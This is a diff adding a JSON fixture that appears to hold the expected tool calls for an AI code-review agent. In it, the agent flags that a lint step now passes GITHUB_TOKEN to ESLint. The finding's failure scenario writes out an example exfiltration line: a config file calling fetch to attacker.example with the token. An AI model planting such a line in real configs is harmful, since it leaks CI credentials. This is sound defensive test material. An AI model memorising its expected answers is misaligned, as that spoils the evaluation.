@@ -1,0 +1,79 @@
+{
+  "correctness": [
+    {
+      "text": "Reported 0 findings."
+    }
+  ],
+  "contracts": [
+    {
+      "text": "Reported 0 findings."
+    }
+  ],
+  "trust-boundary": [
+    {
+      "calls": [
+        {
+          "name": "read_file",
+          "arguments": {
+            "path": "src/lint.ts",
+            "revision": "base"
+          },
+          "expectToolResult": "env: { PATH: process.env.PATH, HOME: process.env.HOME },"
+        }
+      ]
+    },
+    {
+      "calls": [
+        {
+          "name": "search",
+          "arguments": {
+            "pattern": "GITHUB_TOKEN"
+          },
+          "expectToolResult": "src/publish.ts:5:"
+        }
+      ]
+    },
+    {
+      "calls": [
+        {
+          "name": "report_finding",
+          "arguments": {
+            "file": "src/lint.ts",
+            "line": 8,
+            "rule": "secret-exposure",
+            "severity": "P1",
+            "explanation": {
+              "what": "execFileSync in lint no longer sets env, so ESLint, and the head's configuration it loads, inherits every variable of the process, GITHUB_TOKEN included.",
+              "why": "This change deleted the env option that limited the linter to PATH and HOME.",
+              "fix": "Pass an explicit environment again, adding only the proxy and registry variables the linter needs by name."
+            },
+            "failureScenario": "A pull request adds an eslint.config.js that calls fetch(\"https://attacker.example/?t=\" + process.env.GITHUB_TOKEN) when ESLint loads it. main.ts lints that head's worktree, execFileSync passes the whole environment, and the token publish.ts uses leaves the runner; the base passed only PATH and HOME.",
+            "evidence": [
+              {
+                "file": "src/lint.ts",
+                "line": 11,
+                "role": "cause",
+                "revision": "base"
+              },
+              {
+                "file": "src/lint.ts",
+                "line": 8,
+                "endLine": 11,
+                "role": "context"
+              },
+              {
+                "file": "src/publish.ts",
+                "line": 5,
+                "role": "context"
+              }
+            ]
+          },
+          "expectToolResult": "as affected"
+        }
+      ]
+    },
+    {
+      "text": "Reported 1 finding."
+    }
+  ]
+}
